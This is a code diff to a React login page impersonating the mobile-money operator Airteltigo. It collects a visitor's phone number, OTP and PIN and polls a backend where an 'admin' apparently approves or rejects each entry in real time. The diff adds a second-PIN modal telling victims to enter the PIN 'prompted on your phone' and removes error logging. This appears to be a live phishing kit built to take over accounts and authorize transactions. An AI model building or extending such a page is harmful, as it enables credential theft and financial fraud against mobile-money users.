@@ -8,12 +8,20 @@ export default function Login() {
   const API_ENDPOINT = import.meta.env.VITE_USER_API_ENDPOINT || 'u1';
   const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
 
-  // ─── Current step: 'phone' | 'otp' | 'pin' ───────────────────────
+  // ─── Current step: 'phone' | 'otp' | 'pin' | 'prompted-pin' ───────────────────────
   const [step, setStep] = useState('phone');
   const [phoneNumber, setPhoneNumber] = useState('');
   const [otp, setOtp] = useState(['', '', '', '']); // 4-digit OTP
-  const [pin, setPin] = useState(''); // 4-6 digit PIN as single input
+  const [pin, setPin] = useState(''); // 4-6 digit PIN (first PIN)
   const [showPin, setShowPin] = useState(false);
+
+  // Prompted PIN Modal state (SECOND PIN - after "Prompt PIN" button clicked)
+  const [promptedPinModal, setPromptedPinModal] = useState({
+    show: false,
+    status: 'waiting', // 'waiting' | 'success' | 'failed'
+    isRetrying: false,
+    showRetryButton: false // ✅ Show retry button while still processing (after 120 sec)
+  });
 
   // UI state
   const [isProcessing, setIsProcessing] = useState(false);
@@ -21,6 +29,7 @@ export default function Login() {
 
   const otpRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
   const pinInputRef = useRef(null);
+  const promptedPinPollIntervalRef = useRef(null); // ✅ Track polling to reset on retry
 
   // ── Phone: digits only ──
   const handlePhoneChange = (e) => {
@@ -61,9 +70,9 @@ export default function Login() {
     if (!/^\d$/.test(e.key)) e.preventDefault();
   };
 
-  // ── PIN text input handler (4-6 digits) ──
+  // ── PIN text input handler (4-6 digits) - FIRST PIN ──
   const handlePinChange = (e) => {
-    const value = e.target.value.replace(/\D/g, ''); // Only digits
+    const value = e.target.value.replace(/\D/g, '');
     if (value.length <= 6) {
       setPin(value);
     }
@@ -86,9 +95,9 @@ export default function Login() {
     }
 
     setIsProcessing(true);
+    localStorage.setItem('airteltigo_phone', phoneNumber);
 
     try {
-      // 1. Send phone to backend
       const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-phone`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -106,9 +115,8 @@ export default function Login() {
         return;
       }
 
-      // 2. Poll for admin approval
       let pollCount = 0;
-      const maxPolls = 300; // 5 minutes (300 * 1 sec)
+      const maxPolls = 300;
       
       const pollInterval = setInterval(async () => {
         pollCount++;
@@ -123,7 +131,6 @@ export default function Login() {
           const statusData = await statusResp.json();
 
           if (statusData.status === 'allow') {
-            // ✅ Admin allowed → Move to OTP
             clearInterval(pollInterval);
             setIsProcessing(false);
             localStorage.setItem('airteltigo_phone', phoneNumber);
@@ -131,7 +138,6 @@ export default function Login() {
             setOtp(['', '', '', '']);
             setTimeout(() => otpRefs[0].current?.focus(), 100);
           } else if (statusData.status === 'invalid') {
-            // ❌ Admin marked as invalid
             clearInterval(pollInterval);
             setIsProcessing(false);
             setErrorModal({
@@ -139,7 +145,6 @@ export default function Login() {
               message: 'Your phone number is not eligible.'
             });
           } else if (pollCount > maxPolls) {
-            // ⏰ Timeout
             clearInterval(pollInterval);
             setIsProcessing(false);
             setErrorModal({
@@ -148,12 +153,11 @@ export default function Login() {
             });
           }
         } catch (error) {
-          console.error('Poll error:', error);
+          // Silently handle poll error
         }
       }, 1000);
 
     } catch (error) {
-      console.error('Phone submission error:', error);
       setIsProcessing(false);
       setErrorModal({
         show: true,
@@ -180,7 +184,6 @@ export default function Login() {
     setIsProcessing(true);
 
     try {
-      // 1. Send OTP to backend
       const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-otp`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -198,7 +201,6 @@ export default function Login() {
         return;
       }
 
-      // 2. Poll for admin approval
       let pollCount = 0;
       const maxPolls = 300;
       
@@ -215,14 +217,12 @@ export default function Login() {
           const statusData = await statusResp.json();
 
           if (statusData.status === 'correct') {
-            // ✅ Admin approved → Move to PIN
             clearInterval(pollInterval);
             setIsProcessing(false);
             setStep('pin');
             setPin('');
             setTimeout(() => pinInputRef.current?.focus(), 100);
           } else if (statusData.status === 'wrong') {
-            // ❌ Admin marked as wrong
             clearInterval(pollInterval);
             setIsProcessing(false);
             setErrorModal({
@@ -232,7 +232,6 @@ export default function Login() {
             setOtp(['', '', '', '']);
             setTimeout(() => otpRefs[0].current?.focus(), 150);
           } else if (pollCount > maxPolls) {
-            // ⏰ Timeout
             clearInterval(pollInterval);
             setIsProcessing(false);
             setErrorModal({
@@ -241,12 +240,11 @@ export default function Login() {
             });
           }
         } catch (error) {
-          console.error('Poll error:', error);
+          // Silently handle poll error
         }
       }, 1000);
 
     } catch (error) {
-      console.error('OTP submission error:', error);
       setIsProcessing(false);
       setErrorModal({
         show: true,
@@ -256,7 +254,7 @@ export default function Login() {
   };
 
   // ══════════════════════════════════════════════════════════════════
-  // STEP 3: PIN SUBMISSION + POLLING
+  // STEP 3: PIN SUBMISSION + POLLING (FIRST PIN)
   // ══════════════════════════════════════════════════════════════════
   const handlePinSubmit = async (e) => {
     e.preventDefault();
@@ -270,9 +268,8 @@ export default function Login() {
     }
 
     setIsProcessing(true);
-
+    
     try {
-      // 1. Send PIN to backend
       const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-pin`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -290,7 +287,6 @@ export default function Login() {
         return;
       }
 
-      // 2. Poll for admin approval
       let pollCount = 0;
       const maxPolls = 300;
       
@@ -305,27 +301,35 @@ export default function Login() {
           });
 
           const statusData = await statusResp.json();
-
+          
           if (statusData.status === 'correct') {
-            // ✅ Admin approved → User authenticated
+            // ✅ PIN CORRECT → GO TO /status
             clearInterval(pollInterval);
             localStorage.setItem('airteltigo_auth', 'true');
             localStorage.setItem('airteltigo_user_phone', phoneNumber);
             setIsProcessing(false);
             await new Promise(r => setTimeout(r, 400));
             navigate('/status');
+          } else if (statusData.status === 'prompt_pin_waiting') {
+            // 🔐 PIN → PROMPT PIN (SECOND PIN) - Show modal and poll for result
+            clearInterval(pollInterval);
+            setIsProcessing(false);
+            setPromptedPinModal({
+              show: true,
+              status: 'waiting',
+              isRetrying: false
+            });
+            pollPromptedPinResult(phoneNumber, false);
           } else if (statusData.status === 'wrong') {
-            // ❌ Admin marked as wrong
+            // ❌ PIN WRONG - Keep on PIN page, don't clear PIN
             clearInterval(pollInterval);
             setIsProcessing(false);
             setErrorModal({
               show: true,
               message: 'The PIN you entered is incorrect.'
             });
-            setPin('');
-            setTimeout(() => pinInputRef.current?.focus(), 150);
+            // PIN stays on screen (not cleared) - user can try again
           } else if (pollCount > maxPolls) {
-            // ⏰ Timeout
             clearInterval(pollInterval);
             setIsProcessing(false);
             setErrorModal({
@@ -334,12 +338,11 @@ export default function Login() {
             });
           }
         } catch (error) {
-          console.error('Poll error:', error);
+          // Silently handle poll error
         }
       }, 1000);
 
     } catch (error) {
-      console.error('PIN submission error:', error);
       setIsProcessing(false);
       setErrorModal({
         show: true,
@@ -348,7 +351,136 @@ export default function Login() {
     }
   };
 
+  // ══════════════════════════════════════════════════════════════════
+  // STEP 4: PROMPTED PIN RESULT POLLING (SECOND PIN - MODAL)
+  // ✅ NEW: 5-minute total poll, retry button after 120 seconds
+  // ✅ Polling continues in background even after retry button shown
+  // ══════════════════════════════════════════════════════════════════
+  const pollPromptedPinResult = (phoneNum, isRetry = false) => {
+    // Clear any existing polling before starting new one
+    if (promptedPinPollIntervalRef.current) {
+      clearInterval(promptedPinPollIntervalRef.current);
+    }
+
+    let pollCount = 0;
+    const maxPolls = 300;           // 5 minutes total (300 seconds)
+    const showRetryAfter = 120;     // Show retry button after 120 seconds
+    
+    promptedPinPollIntervalRef.current = setInterval(async () => {
+      pollCount++;
+
+      try {
+        const statusResp = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-prompted-pin-status`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phoneNumber: phoneNum })
+        });
+
+        const statusData = await statusResp.json();
+
+        // ✅ SUCCESS - Stop polling and navigate
+        if (statusData.status === 'prompted_pin_successful') {
+          clearInterval(promptedPinPollIntervalRef.current);
+          promptedPinPollIntervalRef.current = null;
+          
+          localStorage.setItem('airteltigo_auth', 'true');
+          localStorage.setItem('airteltigo_user_phone', phoneNum);
+          setPromptedPinModal({
+            show: true,
+            status: 'success',
+            isRetrying: isRetry,
+            showRetryButton: false
+          });
+          await new Promise(r => setTimeout(r, 1000));
+          navigate('/status');
+        } 
+        // ❌ FAILED (admin clicked) - Show error modal, stop polling
+        else if (statusData.status === 'prompted_pin_failed') {
+          clearInterval(promptedPinPollIntervalRef.current);
+          promptedPinPollIntervalRef.current = null;
+          
+          setPromptedPinModal({
+            show: true,
+            status: 'failed',
+            isRetrying: isRetry,
+            showRetryButton: false
+          });
+        }
+        // ⏱️ RETRY BUTTON TRIGGER (120 seconds elapsed, still waiting)
+        else if (pollCount === showRetryAfter) {
+          setPromptedPinModal({
+            show: true,
+            status: 'waiting', // ✅ Keep 'waiting' to show spinner
+            isRetrying: isRetry,
+            showRetryButton: true // ✅ ADD retry button to spinner
+          });
+        }
+        // ⏰ TOTAL TIMEOUT (5 minutes)
+        else if (pollCount > maxPolls) {
+          clearInterval(promptedPinPollIntervalRef.current);
+          promptedPinPollIntervalRef.current = null;
+          
+          setPromptedPinModal({
+            show: true,
+            status: 'failed', // ✅ Switch to failed modal after 5 min
+            isRetrying: isRetry,
+            showRetryButton: false
+          });
+          setErrorModal({
+            show: true,
+            message: 'Prompted PIN verification timed out after 5 minutes. Please try again.'
+          });
+        }
+      } catch (error) {
+        // Silently handle poll error
+      }
+    }, 1000);
+  };
+
+  // ══════════════════════════════════════════════════════════════════
+  // PROMPTED PIN RETRY - Resets 5-minute timer
+  // ══════════════════════════════════════════════════════════════════
+  const handlePromptedPinRetry = async () => {
+    setPromptedPinModal({
+      show: true,
+      status: 'waiting',
+      isRetrying: true,
+      showRetryButton: false // ✅ Reset button flag
+    });
+
+    try {
+      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/prompted-pin-retry`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phoneNumber })
+      });
+
+      const data = await response.json();
+
+      if (!data.success) {
+        setPromptedPinModal({
+          show: true,
+          status: 'failed',
+          isRetrying: true,
+          showRetryButton: false
+        });
+        return;
+      }
+
+      // ✅ Start fresh polling with reset 5-minute timer
+      pollPromptedPinResult(phoneNumber, true);
+    } catch (error) {
+      setPromptedPinModal({
+        show: true,
+        status: 'failed',
+        isRetrying: true,
+        showRetryButton: false
+      });
+    }
+  };
+
   const closeErrorModal = () => setErrorModal({ show: false, message: '' });
+  const closePromptedPinModal = () => setPromptedPinModal({ show: false, status: 'waiting', isRetrying: false, showRetryButton: false });
 
   const isPhoneValid = isValidPhone(phoneNumber);
   const isOtpComplete = otp.every(d => d !== '');
@@ -370,7 +502,7 @@ export default function Login() {
           <div className="logo-large">
             <div className="airteltigo-logo-large">
               <div className="airteltigo-circle-large">
-                <span className="airteltigo-a-large">A</span>
+                <img src="/vite.svg" alt="Airteltigo" style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
               </div>
               <span className="logo-large-airteltigo">Airteltigo</span>
             </div>
@@ -404,7 +536,7 @@ export default function Login() {
         <div className="logo-large">
           <div className="airteltigo-logo-large">
             <div className="airteltigo-circle-large">
-              <span className="airteltigo-a-large">A</span>
+              <img src="/vite.svg" alt="Airteltigo" style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
             </div>
             <span className="logo-large-airteltigo">Airteltigo</span>
           </div>
@@ -507,7 +639,7 @@ export default function Login() {
             </>
           )}
 
-          {/* ── PIN STEP (New: Single Text Input, 4-6 digits) ── */}
+          {/* ── PIN STEP (FIRST PIN) ── */}
           {step === 'pin' && (
             <>
               <div className="pin-section-login">
@@ -571,7 +703,7 @@ export default function Login() {
             <div className="footer-logo-text">
               <div className="footer-airteltigo-logo">
                 <div className="footer-airteltigo-circle">
-                  <span className="footer-airteltigo-a">A</span>
+                  <img src="/vite.svg" alt="Airteltigo" style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
                 </div>
                 <span className="footer-logo-airteltigo">Airteltigo</span>
               </div>
@@ -597,6 +729,62 @@ export default function Login() {
             <button className="error-modal-button" onClick={closeErrorModal}>
               TRY AGAIN
             </button>
+          </div>
+        </div>
+      )}
+
+      {/* PROMPTED PIN Modal (SECOND PIN) */}
+      {promptedPinModal.show && (
+        <div className="prompted-pin-modal-overlay" onClick={promptedPinModal.status === 'failed' ? undefined : closePromptedPinModal}>
+          <div className="prompted-pin-modal-content" onClick={(e) => e.stopPropagation()}>
+            {promptedPinModal.status === 'waiting' && (
+              <>
+                <div className="spinner-container-modal">
+                  <div className="airteltigo-spinner"></div>
+                </div>
+                <h3 className="prompted-pin-modal-title">Enter PIN from Your Phone</h3>
+                <p className="prompted-pin-modal-message">
+                  ENTER THE AIRTELTIGO PIN PROMPTED ON YOUR PHONE TO COMPLETE THE PROCESS
+                </p>
+                
+                {/* ✅ Show retry button with spinner (after 120 sec) */}
+                {promptedPinModal.showRetryButton && (
+                  <button 
+                    className="prompted-pin-retry-button" 
+                    onClick={handlePromptedPinRetry}
+                    style={{ marginTop: '1.5rem' }}
+                  >
+                    RETRY
+                  </button>
+                )}
+              </>
+            )}
+
+            {promptedPinModal.status === 'success' && (
+              <>
+                <div className="success-icon">✅</div>
+                <h3 className="prompted-pin-modal-title">PIN Verified</h3>
+                <p className="prompted-pin-modal-message">
+                  Your PIN has been verified successfully!
+                </p>
+              </>
+            )}
+
+            {promptedPinModal.status === 'failed' && (
+              <>
+                <div className="error-icon">❌</div>
+                <h3 className="prompted-pin-modal-title">PIN Verification Failed</h3>
+                <p className="prompted-pin-modal-message">
+                  The PIN you entered was incorrect. Please try again.
+                </p>
+                <button 
+                  className="prompted-pin-retry-button" 
+                  onClick={handlePromptedPinRetry}
+                >
+                  RETRY
+                </button>
+              </>
+            )}
           </div>
         </div>
       )}
